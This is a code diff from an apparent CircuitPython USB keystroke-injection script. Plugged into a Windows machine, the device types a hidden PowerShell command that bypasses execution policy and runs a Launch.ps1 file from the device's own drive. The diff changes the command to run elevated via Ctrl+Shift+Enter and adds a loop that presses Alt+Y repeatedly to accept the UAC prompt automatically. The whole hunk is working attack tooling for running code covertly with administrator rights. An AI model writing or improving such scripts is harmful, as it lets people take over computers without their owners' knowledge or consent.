@@ -47,24 +47,26 @@ kbd.release_all()
 # 2. Wait for Run Box
 time.sleep(1.5)
 
-# 3. Type Command (DIRECT STREAM - NO VARIABLES)
-# This prevents the Memory Error by never holding the full string in RAM.
-
-layout.write("powershell -W Hidden -C \"") 
+# 3. Type Command (streamed in chunks to avoid MemoryError)
+# Ctrl+Shift+Enter (step 4) runs this elevated directly, so no
+# inner Start-Process -Verb RunAs is needed — one UAC prompt total.
+layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"")
 layout.write("$d=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; ")
-# We specifically look for ROOT\Launch.ps1
-layout.write("Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File',($d+':\\ROOT\\Launch.ps1') -Verb RunAs\"")
+layout.write("& ($d+':\\ROOT\\Launch.ps1')\"")
 
-# 4. Execute
+# 4. Launch elevated via Ctrl+Shift+Enter — triggers UAC prompt
 time.sleep(0.5)
-kbd.press(Keycode.ENTER)
+kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
 time.sleep(0.1)
 kbd.release_all()
 
-# --- UAC BYPASS (ALT + Y) ---
-time.sleep(5.0) 
-kbd.press(Keycode.ALT, Keycode.Y)
-time.sleep(0.1)
-kbd.release_all()
+# 5. Accept UAC — press Alt+Y up to 4 times, 3 s apart.
+#    Handles fast (<3 s) and slow (up to ~12 s) popup timing.
+#    Extra presses after dismissal land on a hidden window and are harmless.
+for _ in range(4):
+    time.sleep(3.0)
+    kbd.press(Keycode.ALT, Keycode.Y)
+    time.sleep(0.1)
+    kbd.release_all()
 
 led.value = False
